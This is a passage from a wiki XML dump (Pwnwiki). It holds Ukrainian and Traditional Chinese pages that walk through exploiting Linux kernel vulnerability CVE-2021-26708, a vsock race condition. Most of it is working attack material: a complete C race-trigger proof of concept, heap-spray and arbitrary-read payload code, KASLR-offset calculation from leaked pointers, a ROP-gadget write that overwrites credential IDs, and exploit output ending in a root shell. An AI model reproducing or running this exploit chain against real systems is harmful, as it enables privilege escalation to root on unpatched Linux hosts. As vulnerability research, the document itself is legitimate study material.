    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info міститься в даних ін'єкції, саме на відстані SKB_SHINFO_OFFSET, що становить 3776 байт. Покажчик skb_shared_info.destructor_arg зберігає адресу struct ubuf_info. Оскільки відома адреса ядра атакованого sk_buff, підроблений ubuf_info можна створити за адресою MY_UINFO_OFFSET у мережевому буфері. Нижче наведено схему дійсного корисного навантаження:

[[File:T0185ccbf9f025c74da.png  | 600px]]

Поговоримо про зворотний виклик destructor_arg:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

Оскільки в vmlinuz-5.10.11-200.fc33.x86_64 я не зміг знайти гаджет, який міг би задовольнити мої потреби, я дослідив і сконструював його сам.

Покажчик функції зворотного виклику зберігає адресу гаджета ROP, RDI зберігає перший параметр функції зворотного виклику, який є адресою самого ubuf_info, а RDI + 8 вказує на ubuf_info.desc. гаджет переміщує ubuf_info.desc до RDX. Тепер RDX містить ефективний ідентифікатор користувача та адресу ідентифікатора групи мінус один байт. Цей байт дуже важливий: коли пристрій пише повідомлення 1 з RSI в пам'ять, на яку вказує RDX, ефективний uid і gid буде перезаписаний нулем. Повторюйте той самий процес, доки привілеї не буде оновлено до root. Вихідний потік усього процесу такий:
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
[+] Found sock_def_write_space ffffffffab9851b0 (offset 4736 in the leaked kmem)
[+] Calculated kaslr offset: 2a000000

[+] stage IV: search sprayed skb near sk_memcg...
[+] checking possible skb location: ffff9125c42fa000
[+] stage IV part I: repeat arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4640
    kaddr for arb read: ffff9125c42fa030
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c42fa030 at 0x7f0d91120ff8
[+] go racing, show wins: 0 0 20 15 42 11 
[+] stage IV part II: arbitrary read skb via good overwritten msg_msg (msq 12)
[+] msgrcv returned 6096 bytes
[+] found a real skb

[+] stage V: try to do UAF on skb at ffff9125c42fa000
[+] skb payload:
    start at 0x7f0d91120004
    skb_shared_info at 0x7f0d91120ec4
    tx_flags 0x8
    destructor_arg 0xffff9125c42fa100
    callback 0xffffffffab64f6d4
    desc 0xffff9125c3fd6e53
[+] go racing, show wins: 15 

[+] stage VI: repeat UAF on skb at ffff9125c42fa000
[+] go racing, show wins: 0 12 13 15 3 12 4 16 17 18 9 47 5 12 13 9 13 19 9 10 13 15 12 13 15 17 30 

[+] finish as: uid=0, euid=0
[+] starting the root shell...
uid=0(root) gid=0(root) groups=0(root),1000(a13x) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
&lt;/pre&gt;

== Відео ==
&lt;youtube&gt;https://www.youtube.com/watch?v=EC8PFOYOUgU&lt;/youtube&gt;


== Довідка ==
https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html</text>
      <sha1>ry694zhkz3cz8lc07i7wgy6quns0x31</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2021-26708 Linux kernel before 5.10.13 特權提升漏洞/zh-hant</title>
    <ns>0</ns>
    <id>2042</id>
    <revision>
      <id>2467</id>
      <timestamp>2021-05-05T06:22:11Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()"</comment>
      <origin>2467</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="23945" sha1="ggearuhyismvtkioh3esjbg9bxvjjf4" xml:space="preserve">&lt;languages  /&gt;
==脆弱點==

這些漏洞是由&lt;code&gt;net/vmw_vsock/af_vsock.c&lt;/code&gt;中的錯誤鎖定引起的條件競爭。這些條件競爭是在2019年11月添加VSOCK多傳輸支持的提交中隱式引入的，並被合併到Linux內核5.5-rc1版本中。

&lt;code&gt;CONFIG_VSOCKETS&lt;/code&gt;和&lt;code&gt;CONFIG_VIRTIO_VSOCKETS&lt;/code&gt;在所有主要的GNU/Linux發行版中都作為內核模塊提供。當你為AF_VSOCK域創建一個套接字時，這些易受攻擊的模塊會自動加載。
&lt;pre&gt;
vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
&lt;/pre&gt;

&lt;code&gt;AF_VSOCK&lt;/code&gt;套接字的創建對非特權用戶來說是可用的，並不需要用戶名空間。


==內存破壞==

下面詳細介紹CVE-2021-26708的利用，利用了&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;中的條件競爭，復現需要兩個線程，第一個線程調用&lt;code&gt;setsockopt()&lt;/code&gt;：
&lt;pre&gt;
  setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
                &amp;size, sizeof(unsigned long));
&lt;/pre&gt;



第二個線程在&lt;code&gt;vsock_stream_etssockopt()&lt;/code&gt;試圖獲取套接字鎖時改變虛擬套接字傳輸，通過重新連接虛擬套接字實現：
&lt;pre&gt;
struct sockaddr_vm addr = {
        .svm_family = AF_VSOCK,
    };

    addr.svm_cid = VMADDR_CID_LOCAL;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

    addr.svm_cid = VMADDR_CID_HYPERVISOR;
    connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));
&lt;/pre&gt;


為了處理虛擬套接字的&lt;code&gt;connect()&lt;/code&gt;，內核執行調用&lt;code&gt;vsock_assign_transport()&lt;/code&gt;的&lt;code&gt;vsock_stream_connect()&lt;/code&gt;。這個函數包含如下代碼：
&lt;pre&gt;
     if (vsk-&gt;transport) {
            if (vsk-&gt;transport == new_transport)
                return 0;

            /* transport-&gt;release() must be called with sock lock acquired.
             * This path can only be taken during vsock_stream_connect(),
             * where we have already held the sock lock.
             * In the other cases, this function is called on a new socket
             * which is not assigned to any transport.
             */
            vsk-&gt;transport-&gt;release(vsk);
            vsock_deassign_transport(vsk);
        }
&lt;/pre&gt;

&lt;code&gt;vsock_stream_connect()&lt;/code&gt;包含套接字鎖，並行線程中的&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;也嘗試獲取它，構成條件競爭。因此，當用不同的&lt;code&gt;svm_cid&lt;/code&gt;進行第二次&lt;code&gt;connect()&lt;/code&gt;時，&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;函數被調用。該函數執行&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;，釋放&lt;code&gt;vsock_sock.trans&lt;/code&gt;，&lt;code&gt;vsk-&gt;transport&lt;/code&gt;被設置為NULL。當&lt;code&gt;vsock_stream_connect()&lt;/code&gt;釋放套接字鎖時，&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;可以繼續執行。它調用&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;，隨後調用&lt;code&gt;transport-&gt;notify_buffer_size()&lt;/code&gt;。這裡transport包含一個來自本地變量的過時的值，與&lt;code&gt;vsk-&gt;transport&lt;/code&gt;不匹配(本因被設為NULL)。

內核執行&lt;code&gt;virtio_transport_notify_buffer_size()&lt;/code&gt;，出現內存破壞：
&lt;pre&gt;
void virtio_transport_notify_buffer_size(struct vsock_sock *vsk, u64 *val)
{
    struct virtio_vsock_sock *vvs = vsk-&gt;trans;

    if (*val &gt; VIRTIO_VSOCK_MAX_BUF_SIZE)
        *val = VIRTIO_VSOCK_MAX_BUF_SIZE;

    vvs-&gt;buf_alloc = *val;

    virtio_transport_send_credit_update(vsk, VIRTIO_VSOCK_TYPE_STREAM, NULL);
}
&lt;/pre&gt;

這裡，vvs是指向內核內存的指針，它已經在&lt;code&gt;virtio_transport_destruct()&lt;/code&gt;中被釋放。 &lt;code&gt;struct virtio_vsock_sock&lt;/code&gt;的大小為64字節，位於kmalloc-64塊緩存中。 buf_alloc字段類型為u32，位於偏移量40。 &lt;code&gt;VIRTIO_VSOCK_MAX_BUF_SIZE是0xFFFFFFFFUL&lt;/code&gt;。 *val的值由攻擊者控制，它的四個最不重要的字節被寫入釋放的內存中。


==模糊測試==

syzkaller fuzzer沒有辦法重現這個崩潰，於是我決定自行研究。但為什麼fuzzer會失敗呢？觀察&lt;code&gt;vsock_update_buffer_size()&lt;/code&gt;有所發現：
&lt;pre&gt;
 if (val != vsk-&gt;buffer_size &amp;&amp;
      transport &amp;&amp; transport-&gt;notify_buffer_size)
        transport-&gt;notify_buffer_size(vsk, &amp;val);

    vsk-&gt;buffer_size = val;

&lt;/pre&gt;

只有當val與當前的buffer_size不同時，才會調用&lt;code&gt;notify_buffer_size()&lt;/code&gt;，也就是說&lt;code&gt;setsockopt()&lt;/code&gt;執行&lt;code&gt;SO_VM_SOCKETS_BUFFER_SIZE&lt;/code&gt;時，每次調用的size參數都應該不同。於是我構建了相關代碼:
&lt;pre&gt;
/*
 * AF_VSOCK vulnerability trigger.
 * It's a PoC just for fun.
 * Author: Alexander Popov &lt;alex.popov@linux.com&gt;.
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;pthread.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;linux/vm_sockets.h&gt;
#include &lt;unistd.h&gt;

#define err_exit(msg) do { perror(msg); exit(EXIT_FAILURE); } while (0)

#define MAX_RACE_LAG_USEC 50

int vsock = -1;
int tfail = 0;
pthread_barrier_t barrier;

int thread_sync(long lag_nsec)
{
	int ret = -1;
	struct timespec ts0;
	struct timespec ts;
	long delta_nsec = 0;

	ret = pthread_barrier_wait(&amp;barrier);
	if (ret != 0 &amp;&amp; ret != PTHREAD_BARRIER_SERIAL_THREAD) {
		perror("[-] pthread_barrier_wait");
		return EXIT_FAILURE;
	}

	ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts0);
	if (ret != 0) {
		perror("[-] clock_gettime");
		return EXIT_FAILURE;
	}

	while (delta_nsec &lt; lag_nsec) {
		ret = clock_gettime(CLOCK_MONOTONIC, &amp;ts);
		if (ret != 0) {
			perror("[-] clock_gettime");
			return EXIT_FAILURE;
		}

		delta_nsec = (ts.tv_sec - ts0.tv_sec) * 1000000000 +
						ts.tv_nsec - ts0.tv_nsec;
	}

	return EXIT_SUCCESS;
}

void *th_connect(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct sockaddr_vm addr = {
		.svm_family = AF_VSOCK,
	};

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	addr.svm_cid = VMADDR_CID_LOCAL;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	addr.svm_cid = VMADDR_CID_HYPERVISOR;
	connect(vsock, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr_vm));

	return NULL;
}

void *th_setsockopt(void *arg)
{
	int ret = -1;
	long lag_nsec = *((long *)arg) * 1000;
	struct timespec tp;
	unsigned long size = 0;

	ret = thread_sync(lag_nsec);
	if (ret != EXIT_SUCCESS) {
		tfail++;
		return NULL;
	}

	clock_gettime(CLOCK_MONOTONIC, &amp;tp);
	size = tp.tv_nsec;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_SIZE,
						&amp;size, sizeof(unsigned long));

	return NULL;
}

int main(void)
{
	int ret = -1;
	unsigned long size = 0;
	long loop = 0;
	pthread_t th[2] = { 0 };

	vsock = socket(AF_VSOCK, SOCK_STREAM, 0);
	if (vsock == -1)
		err_exit("[-] open vsock");

	printf("[+] AF_VSOCK socket is opened\n");

	size = 1;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MIN_SIZE,
						&amp;size, sizeof(unsigned long));
	size = 0xfffffffffffffffdlu;
	setsockopt(vsock, PF_VSOCK, SO_VM_SOCKETS_BUFFER_MAX_SIZE,
						&amp;size, sizeof(unsigned long));

	ret = pthread_barrier_init(&amp;barrier, NULL, 2);
	if (ret != 0)
		err_exit("[-] pthread_barrier_init");

	for (loop = 0; loop &lt; 30000; loop++) {
		long tmo1 = 0;
		long tmo2 = loop % MAX_RACE_LAG_USEC;

		printf("race loop %ld: tmo1 %ld, tmo2 %ld\n", loop, tmo1, tmo2);

		ret = pthread_create(&amp;th[0], NULL, th_connect, &amp;tmo1);
		if (ret != 0)
			err_exit("[-] pthread_create #0");

		ret = pthread_create(&amp;th[1], NULL, th_setsockopt, &amp;tmo2);
		if (ret != 0)
			err_exit("[-] pthread_create #1");

		ret = pthread_join(th[0], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #0");

		ret = pthread_join(th[1], NULL);
		if (ret != 0)
			err_exit("[-] pthread_join #1");

		if (tfail) {
			printf("[-] some thread got troubles\n");
			exit(EXIT_FAILURE);
		}
	}

	ret = close(vsock);
	if (ret)
		perror("[-] close");

	printf("[+] now see your warnings in the kernel log\n");
	return 0;
}
&lt;/pre&gt;

這裡的size值取自&lt;code&gt;clock_gettime()&lt;/code&gt;返回的納秒數，每次都可能不同。原始的syzkaller不會這麼處理，因為在syzkaller生成 fuzzing輸入時，syscall參數的值被確定，執行時不會改變。

==四字節的力量==

這裡我選擇Fedora 33 Server作為研究目標，內核版本為5.10.11-200.fc33.x86_64，並決心繞過SMEP和SMAP。

第一步，我開始研究穩定的堆噴射，該漏洞利用執行用戶空間的活動，使內核在釋放的virtio_vsock_sock的位置分配另一個64字節的對象。經過幾次實驗性嘗試後，確認釋放的virtio_vsock_sock被覆蓋，說明堆噴射是可行的。最終我找到了msgsnd() syscall。它在內核空間中創建了struct msg_msg，見pahole輸出：
&lt;pre&gt;
struct msg_msg {
    struct list_head           m_list;               /*     0    16 */
    long int                   m_type;               /*    16     8 */
    size_t                     m_ts;                 /*    24     8 */
    struct msg_msgseg *        next;                 /*    32     8 */
    void *                     security;             /*    40     8 */

    /* size: 48, cachelines: 1, members: 5 */
    /* last cacheline: 48 bytes */
};
&lt;/pre&gt;

前面是消息頭，後面是消息數據。如果用戶空間中的struct msgbuf有一個16字節的mtext，則會在kmalloc-64塊緩存中創建相應的msg_msg。 4字節的write-after-free會破壞偏移量40的void *security指針。 msg_msg.security字段指向由lsm_msg_msg_alloc()分配的內核數據，當收到 msg_msg時，就會被security_msg_msg_free()釋放。因此，破壞security指針的前半部分，就能獲得 arbitrary free。

==內核信息洩露==

這裡使用了[https://www.pwnwiki.org/index.php?title=CVE-2019-18683_Linux_kernel_through_5.3.8_%E7%89%B9%E6%AC%8A%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E CVE-2019-18683]相同的技巧。虛擬套接字的第二個connect()調用&lt;code&gt;vsock_deassign_transport()&lt;/code&gt;，將&lt;code&gt;vsk-&gt;transport&lt;/code&gt;設置為NULL，使得&lt;code&gt;vsock_stream_setsockopt()&lt;/code&gt;在內存崩潰後調用&lt;code&gt;virtio_transport_send_pkt_info()&lt;/code&gt;，出現內核告警：
&lt;pre&gt;
WARNING: CPU: 1 PID: 6739 at net/vmw_vsock/virtio_transport_common.c:34
...
CPU: 1 PID: 6739 Comm: racer Tainted: G        W         5.10.11-200.fc33.x86_64 #1
Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.13.0-2.fc32 04/01/2014
RIP: 0010:virtio_transport_send_pkt_info+0x14d/0x180 [vmw_vsock_virtio_transport_common]
...
RSP: 0018:ffffc90000d07e10 EFLAGS: 00010246
RAX: 0000000000000000 RBX: ffff888103416ac0 RCX: ffff88811e845b80
RDX: 00000000ffffffff RSI: ffffc90000d07e58 RDI: ffff888103416ac0
RBP: 0000000000000000 R08: 00000000052008af R09: 0000000000000000
R10: 0000000000000126 R11: 0000000000000000 R12: 0000000000000008
R13: ffffc90000d07e58 R14: 0000000000000000 R15: ffff888103416ac0
FS:  00007f2f123d5640(0000) GS:ffff88817bd00000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: 00007f81ffc2a000 CR3: 000000011db96004 CR4: 0000000000370ee0
Call Trace:
  virtio_transport_notify_buffer_size+0x60/0x70 [vmw_vsock_virtio_transport_common]
  vsock_update_buffer_size+0x5f/0x70 [vsock]
  vsock_stream_setsockopt+0x128/0x270 [vsock]
...
&lt;/pre&gt;
通過gdb調試，發現RCX寄存器包含了釋放的virtio_vsock_sock的內核地址，RBX寄存器包含了vsock_sock的內核地址。

==實現任意讀==

===從 arbitrary free 到 use-after-free===

從洩露的內核地址釋放一個對象
執行堆噴，用受控數據覆蓋該對象
使用損壞的對象進行權限升級
內核實現的System V消息有限制最大值DATALEN_MSG，即PAGE_SIZE減去sizeof(struct msg_msg))。如果你發送了更大的消息，剩餘的消息會被保存在消息段的列表中。 msg_msg中包含struct msg_msgseg *next用於指向第一個段，size_t m_ts用於存儲大小。當進行覆蓋操作時，就可以把受控的值放在msg_msg.m_ts和msg_msg.next中：

[[File:T01a51dfe7a996e854c.png | 600px ]]


Payload:
&lt;pre&gt;
    #define PAYLOAD_SZ 40 
    void adapt_xattr_vs_sysv_msg_spray(unsigned long kaddr)
    {
        struct msg_msg *msg_ptr;

        xattr_addr = spray_data + PAGE_SIZE * 4 - PAYLOAD_SZ;

        /* Don't touch the second part to avoid breaking page fault delivery */
        memset(spray_data, 0xa5, PAGE_SIZE * 4);

        printf("[+] adapt the msg_msg spraying payload:\n");
        msg_ptr = (struct msg_msg *)xattr_addr;
        msg_ptr-&gt;m_type = 0x1337;
        msg_ptr-&gt;m_ts = ARB_READ_SZ;
        msg_ptr-&gt;next = (struct msg_msgseg *)kaddr; /* set the segment ptr for arbitrary read */
        printf("\tmsg_ptr %p\n\tm_type %lx at %p\n\tm_ts %zu at %p\n\tmsgseg next %p at %p\n",
               msg_ptr,
               msg_ptr-&gt;m_type, &amp;(msg_ptr-&gt;m_type),
               msg_ptr-&gt;m_ts, &amp;(msg_ptr-&gt;m_ts),
               msg_ptr-&gt;next, &amp;(msg_ptr-&gt;next));
    }
&lt;/pre&gt;
但是如何使用msg_msg讀取內核數據呢？通過閱讀msgrcv()系統調用文檔，我找到了好解決方案，使用msgrcv()和MSG標誌：
&lt;pre&gt;
MSG_COPY (since Linux 3.8)
        Nondestructively fetch a copy of the message at the ordinal position  in  the  queue
        specified by msgtyp (messages are considered to be numbered starting at 0).
&lt;/pre&gt;
這個標誌使內核將消息數據複製到用戶空間，不從消息隊列中刪除。如果內核有CONFIG_CHECKPOINT_RESTORE=y，則MSG是可用的，在Fedora Server適用。

===任意讀的步驟===

準備工作：
使用sched_getaffinity()和CPU_COUNT()計算可用的CPU數量（該漏洞至少需要兩個）;
打開/dev/kmsg進行解析;
mmap()將spray_data內存區域配置userfaultfd()作為最後一部分;
啟動一個單獨的pthread來處理userfaultfd()事件;
啟動127個threads用於msg_msg上的setxattr()&amp;userfaultfd()堆噴射，並將它們掛在thread_barrier上;
獲取原始msg_msg的內核地址:
在虛擬套接字上進行條件競爭;
在第二個connect()後，在忙循環中等待35微秒;
調用msgsnd()來建立一個單獨的消息隊列；在內存破壞後，msg_msg對像被放置在virtio_vsock_sock位置;
解析內核日誌，從內核警告（RCX寄存器）中保存msg_msg的內核地址;
同時，從RBX寄存器中保存vsock_sock的內核地址;
使用損壞的 msg_msg對原始msg_msg執行任意釋放:
使用原始 msg_msg地址的4個字節作為 SO_VM_SOCKETS_BUFFER_SIZE，用於實現內存破壞；
在虛擬套接字上進行條件競爭；
在第二個connect()之後馬上調用msgsnd()；msg_msg被放置在virtio_vsock_sock的位置，實現破壞；
現在被破壞的msg_msg的security指針存儲原始msg_msg的地址(來自步驟2)；

[[File:T01a2a2d47c9494c4a5.png | 600px ]]

如果在處理 msgsnd() 的過程中發生了來自 setsockopt()線程的 msg_msg.security內存損壞，進而SELinux權限檢查失敗；
在這種情況下，msgsnd()返回-1，損壞的msg_msg被銷毀；釋放msg_msg.security可以釋放原始msg_msg；
用一個可控的payload 覆蓋原始msg_msg：
msgsnd()失敗後，漏洞就會調用pthread_barrier_wait()，調用127個用於堆噴射的pthreads；
這些pthreads執行setxattr()的payload；
原始msg_msg被可控的數據覆蓋，msg_msg.next指針存儲vsock_sock對象的地址；

[[File:T0140baae964febb059.png | 600px ]]

通過從存儲被覆蓋的 msg_msg的消息隊列中接收消息，將vsock_sock內核對象的內容讀到用戶空間：
&lt;pre&gt;
ret = msgrcv(msg_locations[0].msq_id, kmem, ARB_READ_SZ, 0,
                IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
&lt;/pre&gt;

==尋找攻擊目標==

以下是我找到的點：
1.專用的塊緩存，如PINGv6和sock_inode_cache有很多指向對象的指針
2.struct mem_cgroup *sk_memcg指針在vsock_sock.sk偏移量664處。 mem_cgroup結構是在kmalloc-4k塊緩存中分配的。
3.const struct cred *owner指針在vsock_sock.sk偏移量840處，存儲了可以覆蓋進行權限升級的憑證的地址。
4.void (*sk_write_space)(struct sock *)函數指針在vsock_sock.sk偏移量688處，被設置為sock_def_write_space()內核函數的地址。它可以用來計算KASLR偏移量。

下面是該漏洞如何從內存中提取這些指針:

&lt;pre&gt;
#define SK_MEMCG_RD_LOCATION    (DATALEN_MSG + SK_MEMCG_OFFSET)
#define OWNER_CRED_OFFSET    840
#define OWNER_CRED_RD_LOCATION    (DATALEN_MSG + OWNER_CRED_OFFSET)
#define SK_WRITE_SPACE_OFFSET    688
#define SK_WRITE_SPACE_RD_LOCATION (DATALEN_MSG + SK_WRITE_SPACE_OFFSET) 
/*
 * From Linux kernel 5.10.11-200.fc33.x86_64:
 *   function pointer for calculating KASLR secret
 */
#define SOCK_DEF_WRITE_SPACE    0xffffffff819851b0lu 
unsigned long sk_memcg = 0;
unsigned long owner_cred = 0;
unsigned long sock_def_write_space = 0;
unsigned long kaslr_offset = 0;

/* ... */

    sk_memcg = kmem[SK_MEMCG_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sk_memcg %lx (offset %ld in the leaked kmem)\n",
            sk_memcg, SK_MEMCG_RD_LOCATION);

    owner_cred = kmem[OWNER_CRED_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found owner cred %lx (offset %ld in the leaked kmem)\n",
            owner_cred, OWNER_CRED_RD_LOCATION);

    sock_def_write_space = kmem[SK_WRITE_SPACE_RD_LOCATION / sizeof(uint64_t)];
    printf("[+] Found sock_def_write_space %lx (offset %ld in the leaked kmem)\n",
            sock_def_write_space, SK_WRITE_SPACE_RD_LOCATION);

    kaslr_offset = sock_def_write_space - SOCK_DEF_WRITE_SPACE;
    printf("[+] Calculated kaslr offset: %lx\n", kaslr_offset);
&lt;/pre&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==在 sk_buff 上實現 Use-after-free==
&lt;/div&gt;

Linux內核中與網絡相關的緩衝區用struct sk_buff表示，這個對像中有skb_shared_info與destructor_arg，可以用於控制流劫持。網絡數據和skb_shared_info被放置在由sk_buff.head指向的同一個內核內存塊中。因此，在用戶空間中創建一個2800字節的網絡數據包會使skb_shared_info被分配到kmalloc-4k塊緩存中，mem_cgroup對像也是如此。

我構建了以下步驟：

1.使用socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)創建一個客戶端套接字和32個服務器套接字

2.在用戶空間中準備一個2800字節的緩衝區，並用0x42對其memset()

3.用sendto()將這個緩衝區從客戶端套接字發送到每個服務器套接字，用於在kmalloc-4k中創建sk_buff對象。在每個可用的CPU上使用`sched_setaffinity()

4.對vsock_sock執行任意讀取過程

5.計算可能的sk_buff內核地址為sk_memcg加4096(kmalloc-4k的下一個元素)

6.對這個可能的sk_buff地址執行任意讀

7.如果在網絡數據的位置找到0x42424242424242lu，則找到真正的sk_buff，進入步驟8。否則，在可能的sk_buff地址上加4096，轉到步驟6

8.sk_buff上執行32個pthreads的setxattr()&amp;userfaultfd()堆噴射，並把它們掛在pthread_barrier上

9.對sk_buff內核地址進行任意釋放

10.調用pthread_barrier_wait()，執行32個setxattr()覆蓋skb_shared_info的堆噴pthreads

11.使用recv()接收服務器套接字的網絡消息。

==通過skb_shared_info 進行任意寫==

以下是覆蓋sk_buff對象的有效payload：

&lt;pre&gt;
#define SKB_SIZE        4096
#define SKB_SHINFO_OFFSET    3776
#define MY_UINFO_OFFSET        256
#define SKBTX_DEV_ZEROCOPY    (1 &lt;&lt; 3) 
void prepare_xattr_vs_skb_spray(void)
{
    struct skb_shared_info *info = NULL;

    xattr_addr = spray_data + PAGE_SIZE * 4 - SKB_SIZE + 4;

    /* Don't touch the second part to avoid breaking page fault delivery */
    memset(spray_data, 0x0, PAGE_SIZE * 4);

    info = (struct skb_shared_info *)(xattr_addr + SKB_SHINFO_OFFSET);
    info-&gt;tx_flags = SKBTX_DEV_ZEROCOPY;
    info-&gt;destructor_arg = uaf_write_value + MY_UINFO_OFFSET;

    uinfo_p = (struct ubuf_info *)(xattr_addr + MY_UINFO_OFFSET);
&lt;/pre&gt;

skb_shared_info駐留在噴射數據中，正好在偏移量SKB_SHINFO_OFFSET處，即3776字節。 skb_shared_info.destructor_arg指針存儲了struct ubuf_info的地址。因為被攻擊的sk_buff的內核地址是已知的，所以能在網絡緩衝區的MY_UINFO_OFFSET處創建了一個假的ubuf_info。下面是有效payload的佈局：

[[File:T0185ccbf9f025c74da.png  | 600px]]

下面講講destructor_arg 回調:
&lt;pre&gt;
 /*
     * A single ROP gadget for arbitrary write:
     *   mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rdx + rcx*8], rsi ; ret
     * Here rdi stores uinfo_p address, rcx is 0, rsi is 1
     */
    uinfo_p-&gt;callback = ARBITRARY_WRITE_GADGET + kaslr_offset;
    uinfo_p-&gt;desc = owner_cred + CRED_EUID_EGID_OFFSET; /* value for "qword ptr [rdi + 8]" */
    uinfo_p-&gt;desc = uinfo_p-&gt;desc - 1; /* rsi value 1 should not get into euid */
&lt;/pre&gt;

由於在vmlinuz-5.10.11-200.fc33.x86_64中找不到一個能滿足我需求的gadget，所以我自己進行了研究構造。

callback函數指針存儲一個ROP gadget 地址，RDI存儲callback函數的第一個參數，也就是ubuf_info本身的地址，RDI + 8指向ubuf_info.desc。 gadget 將ubuf_info.desc移動到RDX。現在RDX包含有效用戶ID和組ID的地址減一個字節。這個字節很重要：當gadget從 RSI向 RDX指向的內存中寫入消息1時，有效的 uid和 gid將被零覆蓋。重複同樣的過程，直到權限升級到root。整個過程輸出流如下：
&lt;pre&gt;
[a13x@localhost ~]$ ./vsock_pwn

=================================================
==== CVE-2021-26708 PoC exploit by a13xp0p0v ====
=================================================

[+] begin as: uid=1000, euid=1000
[+] we have 2 CPUs for racing
[+] getting ready...
[+] remove old files for ftok()
[+] spray_data at 0x7f0d9111d000
[+] userfaultfd #1 is configured: start 0x7f0d91121000, len 0x1000
[+] fault_handler for uffd 38 is ready

[+] stage I: collect good msg_msg locations
[+] go racing, show wins: 
    save msg_msg ffff9125c25a4d00 in msq 11 in slot 0
    save msg_msg ffff9125c25a4640 in msq 12 in slot 1
    save msg_msg ffff9125c25a4780 in msq 22 in slot 2
    save msg_msg ffff9125c3668a40 in msq 78 in slot 3

[+] stage II: arbitrary free msg_msg using corrupted msg_msg
    kaddr for arb free: ffff9125c25a4d00
    kaddr for arb read: ffff9125c2035300
[+] adapt the msg_msg spraying payload:
    msg_ptr 0x7f0d91120fd8
    m_type 1337 at 0x7f0d91120fe8
    m_ts 6096 at 0x7f0d91120ff0
    msgseg next 0xffff9125c2035300 at 0x7f0d91120ff8
[+] go racing, show wins: 

[+] stage III: arbitrary read vsock via good overwritten msg_msg (msq 11)
[+] msgrcv returned 6096 bytes
[+] Found sk_memcg ffff9125c42f9000 (offset 4712 in the leaked kmem)
[+] Found owner cred ffff9125c3fd6e40 (offset 4888 in the leaked kmem)
